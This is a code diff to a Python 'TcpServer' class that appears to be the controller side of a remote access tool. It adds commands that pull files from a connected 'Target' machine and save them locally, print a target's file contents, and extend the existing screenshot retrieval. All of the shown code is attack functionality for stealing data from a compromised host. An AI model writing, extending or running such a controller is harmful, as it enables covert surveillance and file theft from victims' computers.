@@ -163,6 +163,46 @@ class TcpServer:
                         print(f"\033[1;32m[+]\033[0;0m - Screenshot Download finished! File Size: {str(int_screenshot_size)} \nGoing Back to Input...")
                         continue
 
+                    if message_command.startswith("download "):
+
+                        file_name = message_command.split(" ")[1]
+                        self.client.send(message_command.encode())
+                        print("\033[0;31m[+]\033[0;0m - Waiting File Size...")
+                        try:
+                            screenshot_size = self.client.recv(1024).decode("utf-8")
+                            int_screenshot_size = int(screenshot_size)
+
+                            print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")
+
+                            str_data = b""
+                            while len(str_data) < int_screenshot_size:
+                                str_data += self.client.recv(int_screenshot_size)
+            
+                            with open(f"/home/ferreira/Documents/{file_name}","wb") as sc:
+                                sc.write(str_data)
+                            print(f"\033[1;32m[+]\033[0;0m - Download to {file_name} finished! File Size: {str(int_screenshot_size)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
+                            continue
+                        except IsADirectoryError:
+                            print("The Target's file is A directory!")
+                            continue
+                            
+                    if message_command == "cat":
+                        print("You need to especify a file!")
+                        continue
+                    
+                    if message_command.startswith("cat "):
+                        self.client.send(message_command.encode())
+                        cat_size = self.client.recv(1024)
+
+                        str_cat = b""
+                        while len(str_cat) < int(cat_size):
+                            str_cat += self.client.recv(int(cat_size))
+                            print(str_cat.decode())
+                        continue
+                        
+                           
+
+
 
 
 
